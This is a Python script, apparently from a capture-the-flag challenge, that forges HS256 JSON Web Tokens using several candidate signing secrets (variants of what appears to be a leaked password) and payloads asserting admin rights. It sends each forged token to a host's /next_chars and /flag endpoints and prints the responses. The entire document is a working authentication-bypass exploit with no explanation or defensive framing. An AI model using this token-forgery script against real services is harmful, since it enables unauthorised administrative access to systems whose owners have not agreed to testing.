#!/usr/bin/env python3
import hmac, hashlib, base64, json, time, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt(secret: str, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(',',':')).encode())
    p = b64url(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    s = b64url(sig)
    return f"{h}.{p}.{s}"

candidates = [
    "pwd:C%{6bSUAs52sI@$K8Ouk0",
    "C%{6bSUAs52sI@$K8Ouk0",
    "pwd:C%{6bSUAs52sI@$K8Ouk00",
]

payloads = [
    {"admin": True, "timestamp": 1300000000},
    {"admin": True, "timestamp": int(time.time())},
]

for secret in candidates:
    for payload in payloads:
        jwt = forge_jwt(secret, payload)
        print(f"\n### secret={secret!r} payload={payload} ###")
        print(f"JWT: {jwt}")
        for path in ["/next_chars?char=s", "/flag"]:
            try:
                r = requests.get(f"http://magic-key.hkn{path}", headers={"JWT": jwt}, timeout=5)
                print(f"  GET {path} -> {r.status_code} : {r.text[:150]}")
            except Exception as e:
                print(f"  GET {path} -> ERROR {e}")
